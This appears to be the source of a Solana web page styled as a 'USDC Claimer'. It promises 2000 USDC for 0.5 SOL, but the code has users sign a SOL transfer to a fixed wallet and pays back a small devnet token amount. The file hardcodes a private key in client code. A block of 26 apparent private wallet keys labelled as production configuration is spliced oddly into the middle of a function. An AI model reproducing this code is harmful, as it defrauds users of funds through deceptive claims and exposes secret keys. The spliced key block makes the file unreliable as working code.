/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "23FvSsMd7paqGxWffTqFsumhPFg3GNfcXnwm15moWHoe78cGS9wTmnJLQXYTHsSuzSECVd5onqVYieZ6TVVA3oog"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "naL8UXRZVD4TZsHwUnxLfMbfcxgGSsHEJbaJmSWUxvwP7YR52awmnRVt4HbZCmVug1to7GzAwudVBnb2xP4icXj",
  "key1": "5wcx2zmy3woRDerM4Dq7ALJjuuC2HL7eEVPQFWoURy4zDqc6Gcp5yhdb4gCZji9UVgwpMXrqqjjJiunUk6ABNg8G",
  "key2": "KuQpjn4KbAonsVxDvQJuk11Qmyt1iDhM2nMfnYv3iYjJ9tYoji7Ujmmx4wLwiz8ZNHsQoE8SFaA9CUF6SuZEXXQ",
  "key3": "3XE7UjZJ1vkVb8u8nGbNp7QnbLpVYcqVfjrFyEh9NPrc38NhNxA2GBMWWmZzLm5J1eGx577GcFDngM5H9kBfyUpJ",
  "key4": "62TbgZDEhQJTH6Z8D9KR4DrcVEJmCcVEpe1CxbrGvrc5zgLaQWn5dnmZ2ttUqKuToQ9QnDMTMcTgH2SYiqF7Nwxt",
  "key5": "ZuDUeyi5ViWejb6WWbsmDSRiyzt5b4vdCMaYG8xiXdfPFPqdxjGXAWsZT2Xb17K8GPvDSM5dAdkPGiR3AiPRbb4",
  "key6": "5xc1iys2mad5mdyo67vmN6jiXUg6fJMgZ6JAJs98vQMj6mKYZSPYevWBUJBvzfsm7PAuJjSCxTjHzqRBctbbZvio",
  "key7": "XyNANG5XxaSYMt8MLnYTtWYWfybfQTrxPUsok6WwmyRhj8B7D4SzbftX3n14vF5TvEoRDuZqnWC4i4YBaNGgjij",
  "key8": "4tg6U7YghAZoLGdhAcZjhSfT9rHfGNri8EJTjVhvcY5as775JZ9XVjx6tMf5itwKqLUhu9eqnxygXMUMZV4dU2MX",
  "key9": "3MxE6XQJnDzTD8emBnT8zPJj59xYSf9DSuRHhfu7bXEiJVvyw8UQsiM9KyKLb25tk33hby5KPHFuJ82y4X3FFRsR",
  "key10": "3a27XRSYokHdiWN6jXu6McnAw1eEmg3xn4DFaFsErXYXb63vh356yCG85LWNhweri4uNYFHBnv5pZsRhCfunzUzL",
  "key11": "78HazkLjiQVpZTNVpc64uZFTvhR2JWfEu7aaPi4BctmxdzkgqNe2jg5r4BBKLW4d9GZjSZo1RAzYLknTJEAHSSY",
  "key12": "3EeiaKTCT59d77arikJbqqD9briJc8iAuhTXw8XJhJCck8DwpDb9qLWdEXwFN1MXjxDi68FNhejvwJxKjgmXVdnk",
  "key13": "EQna8qQCgnN9URNsuTR62cz3H7N4eAz9mhRmDLvfvqVF1Bs8QeonSkkcgwavDPKdKrY4j61RNU49TTKAr2KKQ3P",
  "key14": "SyKQ2QkDvqhSYGvjC2UysRRDGGA24aSgRhJh2iYSHGWbtLbEUrUJnGG482SDUM95kuvwL1BM7foWGvKDHBA4SUT",
  "key15": "4oG6MHtePWDDL5vavBEqiRNWD2VwQeozpxpa6NgjkNjgkR6yRPj8RiJv9mG8DKnagSnMyEZPhYtvg9EPVE6zJYSw",
  "key16": "4nBtPMvzgdUoKTmhP9qAx2RPuwqkSxAUUVtudPVzU7qaiNAzaT1nnbDfNc3Acos2T5eYp1qzjUcB52sKpqWrdg5B",
  "key17": "3GcqBXAe5fkoDMv5dzXhvZoeSMeorQhMs7rz4JxuA7kkH8LeEyVdecrPBdXVvJMHxMoZSEg5MyFqSdLE1AbMRKUq",
  "key18": "3iwidZhweFSn5xEGpHpnyHWCPJRAP3SVhy3WLqk8nuRyayVN1v2QV7o9FuzuZjt6t5WZXKJfhhnSYZb1q2yNLQbD",
  "key19": "5BtCm5GEnif3iwasWCSVPNvFpLX8xyRvNb5ki2NNhyjnq6scviJSq13QJXztU7Y5XqQjyZtqXU1CJBWfpHWSPkPo",
  "key20": "2mVQPqKbwDT91gUGLPLcRfoQqG6iTfqMNLSjVWK5TGyqY5UeCHJu65QLE29z16LUqFxeP7dBjpz1Kjw1BmXt6zM8",
  "key21": "nkk6GXdC9pwgPW7EEFYLAjdeugKvVXiwv8j4JYtMqFZNKhE3Mit1sCntK9Jih34PDEbMmYBHjXqVuhg4AH5d6vY",
  "key22": "3NuSBDkrDGPfJgQTCWdJMeTQ5HXVtGthSSPcXYan5pEGGSJXhbqyRzYGhCFA16yeHGkRWZkPnPYu1oKCVqDV7GCt",
  "key23": "2kKYtsWGPzmYAV96y2YZNbxJNGft5aiVDzSSLoFmVavZBi1fC2wiZ9tCHBeYx572ZChQN4hKcjcqGjwVMKKQqSM6",
  "key24": "2boBhoca9sWDeA9LDr2ucEE1q5Y1yYLAMxgXyTs7pXP5Sc4FThJVbrcvF2Qf1cHvXn7H9GEwJp7h5JxcqzcoPove",
  "key25": "JYMpdMeFj1thmpHXdkkSgprxP5fNzEY8vaYHr5aJz4J9wpsrjjD6MoUrRg8M7QXa2QFi917hTvckXmEaGm6bJ48"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
